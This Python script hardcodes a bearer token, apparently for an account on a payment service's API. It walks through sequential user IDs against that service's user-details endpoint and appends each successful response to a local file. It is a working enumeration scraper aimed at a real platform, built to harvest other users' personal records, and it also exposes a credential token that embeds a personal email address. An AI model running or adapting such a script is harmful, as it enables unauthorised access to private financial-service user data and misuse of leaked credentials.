import requests, json, time
#from functions import getTx

bearer = "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJkYW5pZWxpeW9ndW4xMTFAZ21haWwuY29tIiwidXNlcklkIjoiRE9UMDMzNzcxNzMyIiwibWVyY2hhbnRJZCI6IjA0MTIzNDU2NzgiLCJlbWFpbCI6ImRhbmllbGl5b2d1bjExMUBnbWFpbC5jb20iLCJmdWxseUF1dGhlbnRpY2F0ZWQiOnRydWUsInJvbGUiOlsiUk9MRV9QUkVfQUdFTlQiXSwiYXV0aG9yaXRpZXMiOlsiUk9MRV9QUkVfQUdFTlQiXSwiaWF0IjoxNzAzMjYyNDYzLCJleHAiOjE3MDMyODA0NjN9.woKTseHeKX7PGZMH5vjCXVaNhrtStIhsFPl_9AXkitrCLSM0ei12oiemkeE7ga6oH8UxL80gPaZhgb4HP2CuLw"
userid = input("Enter starting point: ") #400683
userid = int(userid.strip())
while int(userid) < 100000:
    try:
        userid += 1
        useridx = f"DOT0324{userid}"
        print(f"USERID: {useridx}")
        url = f'https://auth.dotpay.africa/v1/auth/user/details/{useridx}'
        mheaders = {"Content-Type": "application/json", "Appversion": "1.3.6", "Serialnumber": "mobile-app","Authorization": bearer, "Accept-Encoding": "gzip, deflate","User-Agent": "okhttp/4.9.1", "Connection": "close"}
        x = requests.get(url, headers = mheaders)
        data = x.text
        respx = x.status_code
        if respx == 200:
            with open("lag.txt", "a") as handle:
                handle.write(str(data) + "\n")
                handle.write("--------------------------------------------------------------------------------------------------------------------------------------\n")
                handle.write("--------------------------------------------------------------------------------------------------------------------------------------\n")
                print("\n ID recorded")

        else:
            print("NOT FOUND")

    except:
        pass